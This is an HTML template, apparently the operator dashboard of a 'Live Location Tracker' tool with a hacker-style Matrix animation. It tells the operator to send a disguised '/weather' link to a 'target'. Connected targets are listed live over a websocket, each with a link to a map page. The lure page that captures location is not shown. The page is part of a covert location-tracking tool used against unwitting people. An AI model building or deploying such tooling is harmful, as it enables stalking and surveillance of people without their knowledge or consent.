<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Location Tracker</title>

    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            color: #00ff66;
            font-family: Consolas, monospace;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Matrix Background */
        #matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        header {
            background: rgba(0, 0, 0, 0.9);
            border-bottom: 2px solid #00ff66;
            box-shadow: 0 0 25px #00ff66;
        }

        .title {
            color: #00ff66 !important;
            text-shadow: 0 0 15px #00ff66;
            animation: glow 1.5s infinite alternate;
        }

        @keyframes glow {
            from {
                text-shadow: 0 0 5px #00ff66;
            }

            to {
                text-shadow: 0 0 20px #00ff66,
                    0 0 40px #00ff66;
            }
        }

        .creator {
            display: inline-block;
            color: #00ff66;
            text-decoration: none;
            font-size: 22px;
            font-weight: bold;
            white-space: nowrap;
            overflow: hidden;
            border-right: 3px solid #00ff66;
            width: 0;
            animation:
                typing 4s steps(27, end) infinite,
                blink .7s infinite;
            text-shadow: 0 0 10px #00ff66;
        }

        @keyframes typing {
            0% {
                width: 0;
            }

            45% {
                width: 27ch;
            }

            70% {
                width: 27ch;
            }

            100% {
                width: 0;
            }
        }

        @keyframes blink {

            0%,
            50% {
                border-color: #00ff66;
            }

            51%,
            100% {
                border-color: transparent;
            }
        }

        code {
            background: #000;
            color: #00ff66;
            border: 1px solid #00ff66;
            padding: 5px 10px;
            border-radius: 5px;
        }

        #tar-content {
            margin-top: 20px;
        }

        #tar-content h1 {
            color: #00ff66;
            text-shadow: 0 0 10px #00ff66;
        }

        .button {
            background: rgba(0, 0, 0, .85) !important;
            color: #00ff66 !important;
            border: 1px solid #00ff66 !important;
            margin-top: 10px;
            transition: .3s;
        }

        .button:hover {
            background: #00ff66 !important;
            color: #000 !important;
            transform: scale(1.02);
            box-shadow: 0 0 20px #00ff66;
        }
    </style>
</head>

<body>

    <canvas id="matrix"></canvas>

    <header class="p-4 has-text-centered">
        <h1 class="title is-3">LIVE LOCATION TRACKER</h1>

        <a href="https://www.instagram.com/manas.in/" class="creator">
            Created by MANAS PRAJAPATI
        </a>

        <p class="mt-4">
            Send to Target:
            <code>{{ global.remoteURL }}/weather</code>
        </p>
    </header>

    <section id="tar-content"
        class="container is-widescreen p-4 is-flex is-flex-direction-column is-gap-2">

        <h1 class="title is-5">TARGETS</h1>

        {{ for(value, key in TARGETS) }}
        <a href="/map?id={{ key }}" class="button is-fullwidth">
            {{ key }}
        </a>
        {{/}}

    </section>

    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>

    <script>
        const content = document.querySelector("#tar-content");

        const socket = io("", {
            secure: true,
            path: "/socket.io",
            transports: ['websocket']
        });

        socket.on("user-connected", newId => {
            const a = document.createElement("a");
            a.href = `/map?id=${newId}`;
            a.className = "button is-fullwidth";
            a.innerText = newId;
            content.appendChild(a);
        });

        /* Matrix Effect */

        const canvas = document.getElementById("matrix");
        const ctx = canvas.getContext("2d");

        function resize() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }

        resize();

        const chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&";
        const fontSize = 16;
        let columns = Math.floor(canvas.width / fontSize);
        let drops = [];

        function init() {
            columns = Math.floor(canvas.width / fontSize);
            drops = [];
            for (let i = 0; i < columns; i++) {
                drops[i] = Math.random() * canvas.height / fontSize;
            }
        }

        init();

        function draw() {
            ctx.fillStyle = "rgba(0,0,0,0.08)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = "#00ff66";
            ctx.font = fontSize + "px monospace";

            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }

                drops[i]++;
            }
        }

        setInterval(draw, 35);

        window.addEventListener("resize", () => {
            resize();
            init();
        });
    </script>

</body>

</html>
